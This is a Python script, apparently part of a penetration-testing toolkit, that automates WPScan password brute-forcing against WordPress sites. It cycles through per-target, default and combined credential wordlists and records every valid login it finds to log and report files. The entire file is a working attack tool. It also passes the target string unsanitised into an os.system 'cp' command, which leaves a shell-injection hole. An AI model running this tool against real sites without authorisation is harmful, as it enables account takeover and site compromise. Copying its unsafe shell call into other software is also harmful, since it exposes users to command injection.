import os
import sys
import subprocess
import tempfile
import re

def run_wpscan_attack_file(target, usernames_file, passwords_file, success_file):
    """
    Runs WPScan using usernames and passwords files and reports all valid credentials
    found (according to the output, which must contain lines in the format:
    [SUCCESS] - username / password).
    """
    command = [
        "wpscan",
        "--url", target,
        "--usernames", usernames_file,
        "--passwords", passwords_file,
        "--no-banner",
        "--update"
    ]
    print(f"[*] Running WPScan: {' '.join(command)}")
    result = subprocess.run(command, capture_output=True, text=True)
    output = result.stdout + "\n" + result.stderr

    if "Scan Aborted" in output and "redirects to" in output:
        print("[*] Analyzing output to extract the new URL...")
        match = re.search(r"redirects to:?\s*(\S+)", output, re.IGNORECASE)
        if match:
            new_url = match.group(1).rstrip('/.')
            print(f"[*] New URL detected: {new_url}. Re-running WPScan on the new URL...")
            return run_wpscan_attack_file(new_url, usernames_file, passwords_file, success_file)
        else:
            print("[!] Could not extract the new URL to re-run WPScan.")
            return 0

    # Look for all occurrences of success in the format: [SUCCESS] - username / password
    success_matches = re.findall(r'\[SUCCESS\]\s*-\s*(\S+)\s*/\s*(\S+)', output)
    if success_matches:
        for username, password in success_matches:
            print(f"[+] Valid credentials found: {username}:{password}")
            with open(success_file, "a", encoding="utf-8") as sf:
                sf.write(f"Valid credentials found in WordPress: {username}:{password}\n")
        return len(success_matches)
    else:
        print("[-] WPScan: No valid credentials found in this attempt.")
        return 0

def wordpress_bruteforce(target):
    """
    Performs brute force against a WordPress site using WPScan and the available wordlists.
    It executes all scenarios:
      1. If the folder wordlists/<target_clean>/ exists:
         - If both files (users.txt and passwords.txt) are found, they are used.
         - If only users.txt exists, the default password list (top_wordpress_passwords.txt) is used.
         Additionally, the scenario user:user is tested for each user.
      2. The combined credentials list from wordlists/misc/common_credentials.txt is tried.
    """
    # Ensure that the target includes the scheme
    if not target.startswith("http://") and not target.startswith("https://"):
        target = "http://" + target
    target_clean = target.replace("http://", "").replace("https://", "").rstrip("/")

    # Directory to save logs and results
    output_dir = os.path.join("logs", target_clean, "http", "wordpress")
    os.makedirs(output_dir, exist_ok=True)
    success_file = os.path.join(output_dir, "credentials.txt")
    # Clear the previous success file (if it exists)
    with open(success_file, "w", encoding="utf-8") as sf:
        sf.write("")

    total_found = 0

    # --- 1. Try with custom lists ---
    custom_dir = os.path.join("wordlists", target_clean)
    users_custom = []
    pass_custom = []
    user_file = os.path.join(custom_dir, "users.txt")
    pass_file = os.path.join(custom_dir, "passwords.txt")
    if os.path.isdir(custom_dir):
        if os.path.isfile(user_file):
            try:
                with open(user_file, "r", encoding="utf-8") as f:
                    users_custom = [line.strip() for line in f if line.strip()]
                print(f"[*] Loaded {len(users_custom)} custom users from {user_file}")
            except Exception as e:
                print(f"[!] Error reading {user_file}: {e}")
        if os.path.isfile(pass_file):
            try:
                with open(pass_file, "r", encoding="utf-8") as f:
                    pass_custom = [line.strip() for line in f if line.strip()]
                print(f"[*] Loaded {len(pass_custom)} custom passwords from {pass_file}")
            except Exception as e:
                print(f"[!] Error reading {pass_file}: {e}")

    if users_custom or pass_custom:
        print("[*] Trying custom combinations...")
        # Case 1: If both custom files exist
        if users_custom and pass_custom:
            total_found += run_wpscan_attack_file(target, user_file, pass_file, success_file)
        # Case 2: If only custom users exist (using the default password list)
        if users_custom:
            default_pass_file = os.path.join("wordlists", "misc", "top_wordpress_passwords.txt")
            if os.path.isfile(default_pass_file):
                try:
                    with open(default_pass_file, "r", encoding="utf-8") as f:
                        default_passwords = [line.strip() for line in f if line.strip()]
                    print(f"[*] Loaded {len(default_passwords)} default passwords from {default_pass_file}")
                except Exception as e:
                    print(f"[!] Error reading {default_pass_file}: {e}")
                    default_passwords = []
            else:
                print(f"[!] Default list not found: {default_pass_file}")
                default_passwords = []
            if default_passwords:
                total_found += run_wpscan_attack_file(target, user_file, default_pass_file, success_file)
        # Additional block: Test user:user scenario
            total_found += run_wpscan_attack_file(target, user_file, user_file, success_file)

    # --- 2. Try with the default combined list ---
    default_combo_file = os.path.join("wordlists", "misc", "common_credentials.txt")
    if os.path.isfile(default_combo_file):
        try:
            with open(default_combo_file, "r", encoding="utf-8") as f:
                combos = [line.strip() for line in f if line.strip()]
            print(f"[*] Loaded {len(combos)} combos from {default_combo_file}")
        except Exception as e:
            print(f"[!] Error reading {default_combo_file}: {e}")
            combos = []
        if combos:
            # Create lists for usernames and passwords from the combos
            usuarios = []
            contrasenas = []
            for combo in combos:
                if ":" in combo:
                    u, p = combo.split(":", 1)
                    usuarios.append(u.strip())
                    contrasenas.append(p.strip())

            with tempfile.NamedTemporaryFile(mode="w", delete=False, encoding="utf-8") as tmp_users:
                for user in usuarios:
                    tmp_users.write(user + "\n")
                tmp_users_file = tmp_users.name

            with tempfile.NamedTemporaryFile(mode="w", delete=False, encoding="utf-8") as tmp_pass:
                for pwd in contrasenas:
                    tmp_pass.write(pwd + "\n")
                tmp_pass_file = tmp_pass.name

            print("[*] Testing combinations from the combined list using temporary files...")
            total_found += run_wpscan_attack_file(target, tmp_users_file, tmp_pass_file, success_file)

            # Remove temporary files
            os.remove(tmp_users_file)
            os.remove(tmp_pass_file)
        else:
            print("[!] The combined list is empty.")
    else:
        print(f"[!] Combined credentials list not found: {default_combo_file}")

    if total_found > 0:
        print(f"[+] Brute force completed. A total of {total_found} valid credential(s) were found.")
        # Copy the success file to logs/<target>/report/wordpress_credentials.txt
        report_dir = os.path.join("logs", target_clean, "report")
        os.makedirs(report_dir, exist_ok=True)
        report_file = os.path.join(report_dir, "wordpress_credentials.txt")
        os.system(f"cp {success_file} {report_file}")
    else:
        print("[-] Brute force completed without finding valid credentials.")
        with open(success_file, "w", encoding="utf-8") as sf:
            sf.write("No valid credentials were found in WordPress.")

def run_http_wordpress_bruteforce(target):
    wordpress_bruteforce(target)

if __name__ == "__main__":
    target = sys.argv[1]
    run_http_wordpress_bruteforce(target)
